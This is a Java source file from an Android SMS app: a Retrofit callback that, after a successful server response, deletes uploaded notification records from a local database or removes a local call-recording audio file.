package gonext.smsapp.servers;

import android.content.Context;
import android.telecom.Call;

import com.google.gson.JsonObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import gonext.smsapp.db.DbService;
import gonext.smsapp.db.NotificationEntity;
import retrofit.Callback;
import retrofit.RetrofitError;
import retrofit.client.Response;

/**
 * Created by ram on 14/09/17.
 */

public class SmsCallback implements Callback<JsonObject>{
    private int req = 0;
    private List<NotificationEntity> notificationEntities = new ArrayList<>();
    private DbService dbService;
    private File file;

    public SmsCallback(int req) {
        this.req = req;
    }

    public SmsCallback(int req, File file) {
        this.req = req;
        this.file = file;
    }

    public SmsCallback(Context context, int req, List<NotificationEntity> notificationEntities) {
        this.req = req;
        this.notificationEntities = notificationEntities;
        dbService = new DbService(context);
    }

    @Override
    public void success(JsonObject o, Response response) {
        System.out.println(response);
        try {
            if (req == 3) {
                for (NotificationEntity notificationEntity : notificationEntities) {
                    if(dbService.getNotification(notificationEntity.getId()) != null) {
                        dbService.deleteNotification(notificationEntity);
                    }
                }
            } else if (req == 5) {//call recorded audio file
                if (file != null && file.exists()) {
                    file.delete();
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void failure(RetrofitError error) {
        System.out.println(error);
        error.printStackTrace();
    }
}
